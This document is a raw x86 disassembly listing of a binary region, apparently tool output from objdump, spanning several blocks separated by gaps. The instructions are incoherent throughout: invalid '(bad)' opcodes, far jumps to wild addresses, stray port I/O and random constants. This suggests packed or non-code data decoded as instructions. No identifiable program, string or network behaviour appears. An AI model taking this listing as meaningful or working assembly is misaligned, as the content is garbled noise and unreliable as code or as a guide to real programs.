  427131:	mov    al,ds:0x72481ec1
  427136:	sub    al,0x8a
  427138:	mov    cl,BYTE PTR [edx+0x51]
  42713b:	lods   al,BYTE PTR ds:[esi]
  42713c:	mov    ch,0xb9
  42713e:	mov    al,ds:0x758012a1
  427143:	xchg   edx,eax
  427144:	mov    BYTE PTR [edi],bh
  427146:	push   ebx
  427147:	je     0x427196
  427149:	pop    eax
  42714a:	mov    al,0xb0
  42714c:	mov    al,ds:0xf79a8596
  427151:	daa    
  427152:	leave  
  427153:	jmp    0x8671568a
  427158:	pop    ss
  427159:	pop    ds
  42715a:	jl     0x42712a
  42715c:	and    ch,bl
  42715e:	cmp    al,0x99
  427160:	mov    edx,0xb7fc5f88
  427165:	dec    esp
  427166:	pop    esi
  427167:	or     al,0xfa
  427169:	inc    ecx
  42716a:	push   edx
  42716b:	gs ins DWORD PTR es:[edi],dx
  42716d:	cwde   
  42716e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42716f:	or     ch,BYTE PTR [esi-0x3b]
  427172:	mov    al,0x6c
  427174:	add    eax,0x885fc629
  427179:	lods   al,BYTE PTR ds:[esi]
  42717a:	xchg   esp,eax
  42717b:	mov    edx,0xce8b5d6e
  427180:	add    esp,ebx
  427182:	les    ebp,FWORD PTR [edx+0x237c5d4e]
  427188:	dec    edi
  427189:	retf   
  42718a:	out    0xb7,al
  42718c:	neg    BYTE PTR [esi+edi*8+0x742a5b4b]
  427193:	aad    0x26
  427195:	cs push esp
  427197:	lods   al,BYTE PTR ds:[esi]
  427198:	cdq    
  427199:	mov    ebp,0xdea1406f
  42719e:	test   al,0x1e
  4271a0:	jecxz  0x427215
  4271a2:	mov    dl,0x8b
  4271a4:	adc    al,0xc
  4271a6:	rcr    DWORD PTR [edx-0x4f4c3ebe],0x91
  4271ad:	xchg   edi,eax
  4271ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271af:	push   ecx
  4271b0:	int    0x8c
  4271b2:	test   al,0x5a
  4271b4:	imul   eax,DWORD PTR [eax],0x0
	...
  427216:	push   ds
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x3c450100
  427224:	mov    bh,0x13
  427226:	mov    BYTE PTR [ecx+0x1070001],ah
  42722c:	add    BYTE PTR [eax],al
  42722e:	push   ss
  42722f:	sti    
  427230:	pushf  
  427231:	pop    esp
  427232:	pushf  
  427233:	das    
  427234:	adc    al,0xed
  427236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427237:	(bad)  
  427239:	into   
  42723a:	dec    ebp
  42723b:	fdivr  DWORD PTR [eax+0x4]
  42723e:	(bad)  
  42723f:	scas   al,BYTE PTR es:[edi]
  427240:	mov    dl,0xfc
  427242:	add    esi,DWORD PTR [edi+0x5da92c24]
  427248:	in     al,dx
  427249:	and    al,0xe
  42724b:	loope  0x42723d
  42724d:	push   0x90f264db
  427252:	popa   
  427253:	(bad)  
  427254:	jne    0x427297
  427256:	lds    ebx,FWORD PTR [eax]
  427258:	sbb    BYTE PTR [edi+edx*1],ah
  42725b:	hlt    
  42725c:	mov    eax,0x142c1454
  427261:	imul   edx,esp,0x77d07490
  427267:	cmp    BYTE PTR gs:[ecx],cl
  42726a:	pop    ss
  42726b:	fcomp  DWORD PTR [eax+ebp*4+0x62fb40b0]
  427272:	fisub  DWORD PTR [ebx+0x54]
  427275:	fdivr  st,st(2)
  427277:	in     al,0x51
  427279:	jnp    0x427250
  42727b:	fsubr  st,st(2)
  42727d:	push   eax
  42727e:	sub    DWORD PTR [edi+0x36],ecx
  427281:	jns    0x4272f4
  427283:	mov    ebx,DWORD PTR [eax-0x4555cae7]
  427289:	lods   eax,DWORD PTR ds:[esi]
  42728a:	lock retf 0x5203
  42728e:	sbb    al,0xe6
  427290:	dec    ebx
  427291:	sub    bl,BYTE PTR [ebx-0x64]
  427294:	and    eax,0x52a8d0f4
  427299:	mov    ebp,0x268203df
  42729e:	pop    edx
  42729f:	ret    
  4272a0:	push   ebx
  4272a1:	cmp    al,0xdf
  4272a3:	mov    ds:0xd322534a,al
  4272a8:	js     0x427234
  4272aa:	jge    0x4272b2
  4272ac:	xchg   al,bh
  4272ae:	or     al,0x23
  4272b0:	add    dh,bl
  4272b2:	dec    ebp
  4272b3:	sub    al,0xcb
  4272b5:	repnz sbb ch,BYTE PTR [ecx+0x29ff1b68]
  4272bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272bd:	jbe    0x4272d8
  4272bf:	sub    BYTE PTR [ecx-0x4f],bh
  4272c2:	pop    esp
  4272c3:	sub    ch,ch
  4272c5:	icebp  
  4272c6:	inc    edi
  4272c7:	loop   0x427286
  4272c9:	into   
  4272ca:	adc    ebp,DWORD PTR [edx-0x73801867]
  4272d0:	rol    edx,1
  4272d2:	xchg   edx,eax
  4272d3:	out    dx,al
  4272d4:	test   al,0xfb
  4272d6:	loopne 0x4272e3
  4272d8:	(bad)  
  4272d9:	clc    
  4272da:	dec    ebx
  4272db:	xor    eax,esp
  4272dd:	dec    edx
  4272de:	das    
  4272df:	rcl    DWORD PTR [edx-0x6a],1
  4272e2:	xor    cl,cl
  4272e4:	lods   al,BYTE PTR ds:[esi]
  4272e5:	pop    eax
  4272e6:	callw  0x6282
  4272ea:	cld    
  4272eb:	stos   DWORD PTR es:[edi],eax
  4272ec:	leave  
  4272ed:	jecxz  0x4272a6
  4272ef:	dec    eax
  4272f0:	fiadd  DWORD PTR [ebx+ebx*1+0x6c1325a7]
  4272f7:	mov    ch,0x3a
  4272f9:	hlt    
  4272fa:	out    0x71,al
  4272fc:	retf   
  4272fd:	rcl    DWORD PTR [esi],1
  4272ff:	sub    al,0xd
  427301:	inc    edi
  427302:	popa   
  427303:	and    DWORD PTR [edi+esi*8],edi
  427306:	js     0x4272c8
  427308:	xor    al,0x5f
  42730a:	and    al,0x1c
  42730c:	sbb    DWORD PTR ds:0x770ee8cc,0x674e2170
  427316:	ror    DWORD PTR [edx-0x4a],0x8f
  42731a:	outs   dx,DWORD PTR ds:[esi]
  42731b:	add    bh,BYTE PTR [eax-0xe]
  42731e:	pusha  
  42731f:	pushf  
  427320:	(bad)  
  427321:	pop    ebp
  427322:	cmc    
  427323:	int3   
  427324:	add    DWORD PTR [eax-0x5ef7c3a5],esp
  42732a:	or     esp,ebp
  42732c:	add    eax,0x87168470
  427331:	mov    ds:0xee60ee,eax
	...
  427396:	adc    bl,BYTE PTR ds:0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	jmp    DWORD PTR [esi]
  4273a4:	push   ds
  4273a5:	loop   0x427336
  4273a7:	mov    ds:0x1070001,al
  4273ac:	add    BYTE PTR [eax],al
  4273ae:	push   ebp
  4273af:	add    dl,BYTE PTR [esp+edi*1-0x24]
  4273b3:	mov    al,0x5d
  4273b5:	bnd jge 0x4273f0
  4273b8:	push   esp
  4273b9:	fild   QWORD PTR [edi]
  4273bb:	push   es
  4273bc:	mov    eax,0xb1ab1ab9
  4273c1:	test   BYTE PTR [eax+0x5e],bh
  4273c4:	cmp    eax,0x105dab5a
  4273c9:	call   0x38359b5f
  4273ce:	mov    DWORD PTR [edi],edi
  4273d0:	push   ds
  4273d1:	mov    ah,BYTE PTR [esi-0x39]
  4273d4:	cmp    al,0xd
  4273d6:	jne    0x4273bc
  4273d8:	ins    WORD PTR es:[edi],dx
  4273da:	mov    dl,ch
  4273dc:	enter  0xa841,0xa0
  4273e0:	shl    DWORD PTR [ecx+0x3ba90acc],cl
  4273e6:	fs mov bh,0x5d
  4273e9:	clc    
  4273ea:	imul   ebx,DWORD PTR [ecx-0x717a694d],0xd20aebe4
  4273f4:	test   DWORD PTR [eax*8+0x6182724f],ebp
  4273fb:	sbb    DWORD PTR [eax+0x1127675b],ecx
  427401:	mov    ds:0x9668830d,al
  427406:	ja     0x4273ed
  427408:	inc    esi
  427409:	and    al,0xf6
  42740b:	aam    0x20
  42740d:	outs   dx,DWORD PTR ds:[esi]
  42740e:	xchg   DWORD PTR [edx+0x3261ceb2],esi
  427414:	fs and al,0xc
  427417:	outs   dx,BYTE PTR ds:[esi]
  427418:	js     0x42739d
  42741a:	mov    ds:0x9b051ede,al
  42741f:	adc    al,0xdb
  427421:	fcomp  QWORD PTR [esi]
  427423:	pop    edi
  427424:	xchg   edi,eax
  427425:	pop    ebx
  427426:	xor    eax,0xce1af7f1
  42742b:	pop    edi
  42742c:	cmp    eax,DWORD PTR [ebx]
  42742e:	fbld   TBYTE PTR [ebx+0x5f]
  427431:	mov    ecx,0x42240dcc
  427436:	aaa    
  427437:	les    edx,FWORD PTR [eax+0x2ca88b8]
  42743d:	mov    DWORD PTR ds:0xcf20bce,edi
  427443:	or     bh,BYTE PTR [esi+0xc]
  427446:	sub    BYTE PTR [ebx+0x5622eb25],dh
  42744c:	outs   dx,BYTE PTR ds:[esi]
  42744d:	fdivrp st(3),st
  42744f:	(bad)  
  427450:	dec    edi
  427451:	fmul   QWORD PTR [esi+0x7c30fd2d]
  427457:	jbe    0x42741b
  427459:	ja     0x4274bf
  42745b:	shl    ah,0xd2
  42745e:	adc    ch,ah
  427460:	gs gs int3 
  427463:	push   eax
  427464:	or     DWORD PTR [edi],esi
  427466:	pop    es
  427467:	cmp    eax,0xb91ab17f
  42746c:	in     al,dx
  42746d:	xchg   ebx,eax
  42746e:	imul   edi,DWORD PTR [edx-0x4e],0xffffffa7
  427472:	xor    DWORD PTR [edx],ebp
  427474:	ja     0x4274c4
  427476:	or     edi,DWORD PTR [esp+ebx*2-0x9cd8e42]
  42747d:	fmul   st(3),st
  42747f:	mov    bh,0xfa
  427481:	ja     0x427427
  427483:	in     al,dx
  427484:	jae    0x427417
  427486:	sub    al,0xf6
  427488:	sahf   
  427489:	mov    ch,bh
  42748b:	xchg   edi,eax
  42748c:	sub    al,al
  42748e:	fsub   st(2),st
  427490:	mov    bh,0xb9
  427492:	repz es mov al,0x6c
  427496:	mov    al,BYTE PTR [bx+si+0x2a6c]
  42749b:	pop    eax
  42749c:	push   es
  42749d:	imul   ebx,esp,0xffffffcd
  4274a0:	test   al,0x94
  4274a2:	repnz imul edi,DWORD PTR [esi-0x5ebf480c],0x4d
  4274aa:	scas   eax,DWORD PTR es:[edi]
  4274ab:	push   es
  4274ac:	cmp    BYTE PTR [ebx+0x4b],0x44
  4274b0:	push   ds
  4274b1:	jne    0x42744b
  4274b3:	fisttp WORD PTR [ebx]
	...
  427515:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx-0x71590af6]
  427523:	add    edi,DWORD PTR [edx+0x22]
  427526:	xchg   esi,eax
  427527:	mov    ds:0x1070001,eax
  42752c:	add    BYTE PTR [eax],al
  42752e:	stos   DWORD PTR es:[edi],eax
  42752f:	addr16 mov eax,ds:0x8063
  427533:	jmp    0x23eab172
  427538:	xchg   ecx,eax
  427539:	mov    edx,0x711549d5
  42753e:	pop    ds
  42753f:	mov    eax,ds:0x8757c651
  427544:	ins    DWORD PTR es:[edi],dx
  427545:	mov    WORD PTR [edi],?
  427547:	and    BYTE PTR [ebx-0x531420ef],dl
  42754d:	xchg   edx,eax
  42754e:	inc    edi
  42754f:	mov    ds:0x7b745fd8,al
  427554:	ins    DWORD PTR es:[edi],dx
  427555:	xchg   ebx,eax
  427556:	inc    ebp
  427557:	popa   
  427558:	dec    eax
  427559:	pop    edi
  42755a:	out    0x1d,al
  42755c:	mov    ds:0x2b7a0836,al
  427561:	ror    DWORD PTR [eax+0xb78ebe5],cl
  427567:	daa    
  427568:	cmp    dh,0xcc
  42756b:	sbb    ecx,edx
  42756d:	(bad)  
  42756e:	pop    ss
  42756f:	in     eax,dx
  427570:	jecxz  0x4275eb
  427572:	dec    ebx
  427573:	cmp    al,0x8
  427575:	sub    BYTE PTR [edi+ebp*1],0x7b
  427579:	(bad)  
  42757a:	lds    ebx,FWORD PTR gs:[ecx+0x25]
  42757e:	cdq    
  42757f:	pushf  
  427580:	fild   QWORD PTR [ebx]
  427582:	imul   ecx,DWORD PTR [ebx+0x3d],0x9f7debfa
  427589:	test   BYTE PTR [ebx-0x35205050],0x5c
  427590:	outs   dx,BYTE PTR ds:[esi]
  427591:	test   BYTE PTR [edx-0x63425310],0xfc
  427598:	push   0x2cc93d5a
  42759d:	test   DWORD PTR es:[eax],ebx
  4275a0:	push   ecx
  4275a1:	aas    
  4275a2:	xor    eax,0xcf7427c9
  4275a7:	add    DWORD PTR [edi+0x105b87a7],eax
  4275ad:	sbb    esp,DWORD PTR [eax+0x1c]
  4275b0:	sbb    eax,0xf1f214d8
  4275b5:	aad    0x5e
  4275b7:	cmc    
  4275b8:	xchg   ecx,eax
  4275b9:	sahf   
  4275ba:	add    al,0x45
  4275bc:	push   0x2b
  4275be:	dec    eax
  4275bf:	cmp    bh,BYTE PTR [eax]
  4275c1:	mov    edx,0x70445608
  4275c6:	adc    edi,DWORD PTR [eax+0x25]
  4275c9:	and    dl,cl
  4275cb:	push   cs
  4275cc:	shl    BYTE PTR [ebx-0x49894682],cl
  4275d2:	test   eax,0x76dadc3
  4275d7:	jns    0x427559
  4275d9:	jbe    0x4275bb
  4275db:	sub    ecx,eax
  4275dd:	outs   dx,DWORD PTR ds:[esi]
  4275de:	xor    al,0x26
  4275e0:	(bad)
  4275e3:	shl    DWORD PTR [esi-0x6e86aaf1],1
  4275e9:	in     eax,dx
  4275ea:	adc    esp,DWORD PTR [edx+ebx*8+0x42]
  4275ee:	ror    BYTE PTR [edi+0x21c55d24],0x9e
  4275f5:	outs   dx,BYTE PTR ds:[esi]
  4275f6:	push   ss
  4275f7:	clc    
  4275f8:	lods   al,BYTE PTR ds:[esi]
  4275f9:	mov    ch,0xaa
  4275fb:	or     DWORD PTR [ebx],esi
  4275fd:	cmp    eax,0xbd47bc7b
  427602:	pop    es
  427603:	(bad)  
  427604:	sbb    eax,0x78d26449
  427609:	in     al,dx
  42760a:	loope  0x4275a4
  42760c:	inc    esi
  42760d:	sar    DWORD PTR [ebx+0x46],1
  427610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427611:	mov    al,ds:0x3097b6f
  427616:	sub    esp,DWORD PTR [esi-0x2c]
  427619:	inc    eax
  42761a:	adc    eax,0x2e25c4db
  42761f:	jl     0x4275eb
  427621:	mov    al,0x60
  427623:	(bad)  
  427624:	mov    WORD PTR [edx+0x22],fs
  427627:	ins    BYTE PTR es:[edi],dx
  427628:	das    
  427629:	sub    eax,0x9aafb366
  42762e:	stc    
  42762f:	in     al,0x58
  427631:	inc    ecx
  427632:	dec    edi
  427633:	cmc    
  427634:	sbb    al,0x0
	...
  427696:	add    DWORD PTR [esi-0x70],edx
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x61bc56af
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [edx+0x40],dh
  4276b0:	add    ah,dh
  4276b2:	mov    al,ds:0x773bebfa
  4276b7:	dec    ecx
  4276b8:	sti    
  4276b9:	pop    eax
  4276ba:	push   0x2ba84eaf
  4276bf:	sbb    dl,BYTE PTR es:[edi-0x686d2836]
  4276c6:	jmp    0x872aa449
  4276cb:	les    eax,FWORD PTR ds:0xead5b27c
  4276d1:	xor    al,0x8b
  4276d3:	adc    eax,0xd9eff3a
  4276d8:	dec    edx
  4276d9:	and    ah,BYTE PTR [esi+0x4f]
  4276dc:	dec    ebx
  4276dd:	mov    ecx,0x9395255f
  4276e2:	inc    edi
  4276e3:	repnz sub al,0xbe
  4276e6:	mov    ah,0xa9
  4276e8:	(bad)  
  4276e9:	lods   al,BYTE PTR ds:[esi]
  4276ea:	ds add al,0x4e
  4276ed:	mov    edi,0x9bcc43a1
  4276f2:	cld    
  4276f3:	and    BYTE PTR [edi+0x61],bl
  4276f6:	inc    esi
  4276f7:	or     ebp,DWORD PTR [ebp-0x68]
  4276fa:	aad    0x6
  4276fc:	pushf  
  4276fd:	mov    dl,0xa3
  4276ff:	ja     0x427705
  427701:	push   cs
  427702:	leave  
  427703:	mov    ch,0x5c
  427705:	retf   
  427706:	mov    ah,0x52
  427708:	mov    eax,ds:0x8490e034
  42770d:	in     eax,dx
  42770e:	fwait
  42770f:	mov    dl,0xec
  427711:	bound  edi,QWORD PTR [ecx]
  427713:	sbb    BYTE PTR [ecx+0xf7984ef],bl
  427719:	in     eax,0x0
  42771b:	dec    esp
  42771c:	(bad)  
  42771e:	loop   0x4276be
  427720:	lods   eax,DWORD PTR cs:[esi]
  427722:	cmp    BYTE PTR [ebx+0x5579560],ch
  427728:	inc    eax
  427729:	cmp    BYTE PTR [eax],dh
  42772b:	pop    ecx
  42772c:	dec    DWORD PTR [esi]
  42772e:	or     dl,BYTE PTR [esi+0x47dd72f9]
  427734:	aaa    
  427735:	aas    
  427736:	imul   DWORD PTR [ebx+0x405d2454]
  42773c:	pop    edi
  42773d:	pusha  
  42773e:	mov    ds:0xdd34db90,eax
  427743:	sub    DWORD PTR [eax-0x51],esi
  427746:	popa   
  427747:	ja     0x4276d7
  427749:	adc    esp,DWORD PTR [eax]
  42774b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42774c:	popf   
  42774d:	test   BYTE PTR [esi-0x2c],ch
  427750:	fchs   
  427752:	mov    edi,0xb5cee616
  427757:	scas   al,BYTE PTR es:[edi]
  427758:	stc    
  427759:	mov    bl,0x36
  42775b:	pop    esp
  42775c:	(bad)  
  42775d:	lea    edx,[edi+0x16]
  427760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427761:	cli    
  427762:	out    0xeb,al
  427764:	lods   eax,DWORD PTR ds:[esi]
  427765:	sub    al,0xa1
  427767:	cmp    al,0x1a
  427769:	mov    dl,0x68
  42776b:	out    0x4d,eax
  42776d:	test   edx,eax
  42776f:	pop    ecx
  427770:	fsub   QWORD PTR [ecx+0x71c945bb]
  427776:	and    DWORD PTR ds:0xd257a623,ecx
  42777c:	lods   eax,DWORD PTR ds:[esi]
  42777d:	rol    DWORD PTR [ebp-0x73],cl
  427780:	out    0x11,eax
  427782:	ret    0xfe9
  427785:	int    0xf4
  427787:	mov    esi,DWORD PTR [edi]
  427789:	test   DWORD PTR ds:[edx],ecx
  42778c:	repz mov ds:0x9d4d06d2,al
  427792:	xchg   ebx,eax
  427793:	push   eax
  427794:	ret    0x517e
  427797:	push   ebp
  427798:	js     0x427746
  42779a:	outs   dx,BYTE PTR ds:[esi]
  42779b:	mov    ebx,0xc2552ec7
  4277a0:	mov    edx,0x8547113b
  4277a5:	add    dh,BYTE PTR [esi]
  4277a7:	jp     0x4277ef
  4277a9:	scas   eax,DWORD PTR es:[edi]
  4277aa:	fcom   QWORD PTR [ebx+eiz*2-0x3189de6f]
  4277b1:	bound  ecx,QWORD PTR [ebx]
  4277b3:	add    al,0x56
	...
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	ret    
  427823:	sti    
  427824:	jp     0x4277f3
  427826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    dh,ch
  42782f:	aam    0x8c
  427831:	push   es
  427832:	jne    0x4277bb
  427834:	add    dh,bl
  427836:	out    0xea,eax
  427838:	or     ebp,esp
  42783a:	or     BYTE PTR [esp+ecx*1],0x4
  42783e:	out    dx,al
  42783f:	mov    edi,0x19070e84
  427844:	outs   dx,DWORD PTR ds:[esi]
  427845:	mov    al,0x44
  427847:	repz mov ah,0xc
  42784a:	dec    edx
  42784b:	mov    DWORD PTR [eax-0x54076cf1],ebx
  427851:	clc    
  427852:	retf   0xd86f
  427855:	es push ss
  427857:	jge    0x427895
  427859:	mov    cl,0x4a
  42785b:	out    0xc,al
  42785d:	lods   al,BYTE PTR ds:[esi]
  42785e:	loop   0x4278a8
  427860:	xchg   edx,eax
  427861:	pop    es
  427862:	jmp    0xda1438ec
  427867:	inc    ebx
  427868:	jns    0x427853
  42786a:	sub    eax,0x282bb6f3
  42786f:	aas    
  427870:	inc    esi
  427871:	cmp    BYTE PTR [esi+0x622a5683],bh
  427877:	sti    
  427878:	mov    cl,0xea
  42787a:	mov    eax,esi
  42787c:	add    eax,DWORD PTR [edi-0x7c]
  42787f:	lea    esi,[esi-0x4a]
  427882:	hlt    
  427883:	scas   al,BYTE PTR es:[edi]
  427884:	sbb    cl,BYTE PTR [ebx+0x2366b6e3]
  42788a:	dec    edx
  42788b:	or     edi,DWORD PTR [ebx+0x289ca8f6]
  427891:	mov    eax,ds:0x14565cf1
  427896:	mov    al,0xa2
  427898:	and    BYTE PTR [edx],bl
  42789a:	mov    eax,0xd550a742
  42789f:	pop    es
  4278a0:	cdq    
  4278a1:	mov    DWORD PTR [ecx+0x6de83d6],esi
  4278a7:	lock in al,dx
  4278a9:	add    BYTE PTR [esi-0x1c],cl
  4278ac:	mov    ebp,0xe1158ea3
  4278b1:	and    bl,bh
  4278b3:	xchg   ebx,eax
  4278b4:	dec    ebp
  4278b5:	xor    eax,DWORD PTR [edx]
  4278b7:	fldlg2 
  4278b9:	and    BYTE PTR [eax+0x20],ch
  4278bc:	adc    al,0x7f
  4278be:	out    dx,al
  4278bf:	sub    DWORD PTR [ebx],esi
  4278c1:	xor    BYTE PTR [ebp+0x52],bl
  4278c4:	imul   esp,esi,0x1b
  4278c7:	loop   0x427896
  4278c9:	pop    ss
  4278ca:	sbb    esi,0xcb592ab
  4278d0:	pop    edi
  4278d1:	sub    DWORD PTR [eax],edx
  4278d3:	push   ss
  4278d4:	mov    ebx,0xb39c8bbe
  4278d9:	mov    eax,gs:0xce588db7
  4278df:	jne    0x4278ed
  4278e1:	mov    ah,0xb6
  4278e3:	sbb    bl,BYTE PTR [ecx-0x32]
  4278e6:	push   edi
  4278e7:	out    dx,eax
  4278e8:	shr    DWORD PTR [ebp+0xb],cl
  4278eb:	mov    eax,ebp
  4278ed:	(bad)  ds:0x129a0076
  4278f3:	xor    ecx,DWORD PTR [ebx+0x3a]
  4278f6:	cmp    BYTE PTR [edi],0x5b
  4278f9:	xor    eax,DWORD PTR [ebx+0x3]
  4278fc:	(bad)  
  4278fd:	jo     0x42792c
  4278ff:	pop    ds
  427900:	popa   
  427901:	jno    0x427978
  427903:	fs jmp 0xd332:0xc6dd5bdf
  42790b:	lods   eax,DWORD PTR ds:[esi]
  42790c:	inc    dx
  42790e:	pop    ebx
  42790f:	lahf   
  427910:	inc    esp
  427911:	push   eax
  427912:	mov    gs,WORD PTR [eax+0x58061f0f]
  427918:	cmp    BYTE PTR [esi+edi*8],bl
  42791b:	fwait
  42791c:	xor    al,BYTE PTR [eax-0x48]
  42791f:	lahf   
  427920:	ret    
  427921:	xchg   edx,eax
  427922:	mov    dh,0x63
  427925:	mov    ebp,0xea61a067
  42792a:	in     al,0x98
  42792c:	fucomi st,st(2)
  42792e:	or     edi,DWORD PTR [eax-0x50]
  427931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427932:	enter  0xb777,0x0
	...
  427996:	call   0xdea3:0xffa3ffdd
  42799d:	std    
  42799e:	in     eax,0x63
  4279a0:	mov    ebx,0x74f5b7d0
  4279a5:	mov    BYTE PTR [ebx+0x70001a6],ch
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [ebp-0x5f],bl
  4279b0:	sbb    BYTE PTR [edi],0xe0
  4279b3:	jl     0x427a00
  4279b5:	inc    eax
  4279b6:	adc    edi,DWORD PTR [esi]
  4279b8:	and    BYTE PTR [esi+0x419f076e],bl
  4279be:	retf   
  4279bf:	mov    dh,0x7
  4279c1:	mov    ah,0x8d
  4279c3:	bound  ebp,QWORD PTR [edi+0x2f]
  4279c6:	lods   al,BYTE PTR ds:[esi]
  4279c7:	or     ecx,DWORD PTR [edx-0x2c15cebf]
  4279cd:	inc    ecx
  4279ce:	lods   eax,DWORD PTR ds:[esi]
  4279cf:	xchg   ebp,eax
  4279d0:	mov    ebp,0xa7cb65ac
  4279d5:	sbb    DWORD PTR [edx+0x10],edx
  4279d8:	cmp    eax,0x9df7bae1
  4279dd:	sti    
  4279de:	inc    ebp
  4279df:	imul   eax,esi,0x4024c582
  4279e5:	ds loopne 0x4279d6
  4279e8:	pop    esp
  4279e9:	repz jns 0x427a5d
  4279ec:	lock sbb esp,DWORD PTR [ecx+0x562a1a25]
  4279f3:	bound  ebx,QWORD PTR [ecx]
  4279f5:	jecxz  0x427a3b
  4279f7:	mov    cl,0xe
  4279f9:	jg     0x4279e7
  4279fb:	or     cl,BYTE PTR [ebp+0x729800b3]
  427a01:	dec    esp
  427a02:	cmp    DWORD PTR ds:[esi-0x24],esi
  427a06:	arpl   si,sp
  427a08:	sbb    BYTE PTR [edi],ch
  427a0a:	sbb    DWORD PTR [edi-0x6cf57421],esi
  427a10:	mov    gs,WORD PTR [edx-0x6a53bc52]
  427a16:	enter  0x4493,0x9d
  427a1a:	sahf   
  427a1b:	inc    edx
  427a1c:	fsub   QWORD PTR [edx-0x1f]
  427a1f:	(bad)  [ebp+eiz*8+0x37]
  427a23:	fadd   QWORD PTR [esi-0x2d]
  427a26:	cwde   
  427a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a28:	jae    0x4279f1
  427a2a:	data16 mov bh,0x6f
  427a2d:	mov    bh,0xfa
  427a2f:	retf   
  427a30:	das    
  427a31:	mov    DWORD PTR [esi],esp
  427a33:	adc    al,0x14
  427a35:	jecxz  0x427a4c
  427a37:	xchg   esp,eax
  427a38:	jae    0x427a42
  427a3a:	mov    esi,0xc41725
  427a3f:	mov    ebp,?
  427a41:	add    bl,BYTE PTR [esi]
  427a43:	inc    edx
  427a44:	xchg   ecx,eax
  427a45:	or     DWORD PTR [ebp-0x56],eax
  427a48:	test   DWORD PTR [edi],ebp
  427a4a:	sub    esi,DWORD PTR [ecx+0xe]
  427a4d:	jmp    0x427a46
  427a4f:	ror    DWORD PTR [edi],1
  427a51:	mov    DWORD PTR [ecx],edx
  427a53:	jmp    0xea6909c3
  427a58:	addr16 test al,0x66
  427a5b:	in     eax,dx
  427a5c:	cmp    al,0x66
  427a5e:	and    eax,0x3c4483e6
  427a63:	jne    0x4279fc
  427a65:	dec    eax
  427a66:	sbb    bh,cl
  427a68:	sbb    esi,DWORD PTR [esi+0x77]
  427a6b:	jae    0x427a18
  427a6d:	stc    
  427a6e:	pop    esi
  427a6f:	adc    edx,esi
  427a71:	rol    esp,cl
  427a73:	mov    ebp,0x687c64ca
  427a78:	xlat   BYTE PTR ds:[ebx]
  427a79:	call   0x97c8:0x3fe85023
  427a80:	mov    esi,eax
  427a82:	mov    esp,0xfeca0372
  427a87:	fs jmp 0x427aff
  427a8a:	(bad)  [eax-0x41]
  427a8d:	leave  
  427a8e:	fistp  QWORD PTR [esi-0x5a977cf8]
  427a94:	dec    ebp
  427a95:	shl    al,1
  427a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a98:	stos   BYTE PTR es:[edi],al
  427a99:	cmc    
  427a9a:	retf   
  427a9b:	push   ebx
  427a9c:	sbb    DWORD PTR ds:0x236026a6,0x25
  427aa3:	mov    ebx,ebx
  427aa5:	popf   
  427aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aa7:	rcr    DWORD PTR [ebx-0x2],1
  427aaa:	(bad)  
  427aab:	fist   DWORD PTR [ebp-0x5f5f3522]
  427ab1:	(bad)  
  427ab2:	xchg   esp,eax
  427ab3:	(bad)  
  427ab4:	clc    
	...
  427b15:	add    dl,cl
  427b17:	mov    edx,DWORD PTR [edx+0x7b]
  427b1a:	push   ebx
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	scas   eax,DWORD PTR es:[edi]
  427b23:	push   es
  427b24:	add    dl,0xb2
  427b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [esp+ebp*4],ch
  427b30:	jns    0x427b6c
  427b32:	ret    
  427b33:	sahf   
  427b34:	int3   
  427b35:	dec    edi
  427b36:	into   
  427b37:	sbb    al,0x95
  427b39:	jne    0x427b13
  427b3b:	ror    DWORD PTR [ebx-0x62a8350b],0xa
  427b42:	jnp    0x427b66
  427b44:	xor    eax,DWORD PTR [edi+0x5d8d3d87]
  427b4a:	test   BYTE PTR [eax+eiz*8],0x60
  427b4e:	add    eax,0xa9bee59d
  427b53:	cmp    eax,DWORD PTR [esi+esi*2]
  427b56:	xchg   esp,eax
  427b57:	retf   0x1d64
  427b5a:	sahf   
  427b5b:	loopne 0x427ba2
  427b5d:	cli    
  427b5e:	imul   ecx,edx,0x3e
